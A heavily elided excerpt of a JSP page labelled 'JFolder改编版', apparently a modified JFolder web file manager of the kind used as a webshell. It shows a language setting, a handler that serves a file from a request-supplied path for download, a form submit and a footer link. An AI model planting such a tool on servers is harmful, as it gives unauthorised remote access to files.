...
<%!private final static int languageNo = 0; //Language,0 : Chinese; 1:English
	...
	String[] authorInfo = { " <font color=red> JFolder改编版 </font>",
			" <font color=red>  </font>" };
...
<%
	...
	if (strAction != null && strAction.equals("down")) {
		...
		response.setHeader("Content-Disposition",
				"attachment;filename=\""
						+ new String(strPath.substring(
								strPath.lastIndexOf("\\") + 1,
								strPath.length()).getBytes("GBK"),
								"ISO-8859-1") + "\"");
 ...
 else
 {
  document.frmCqq.submit();    
	...
	<body>
		...
		<br>
		<center>
			<a href="http://www.17dmt.com" target="_blank">数字营销网络学院</a> ,All
			Rights Reserved.
			<br>
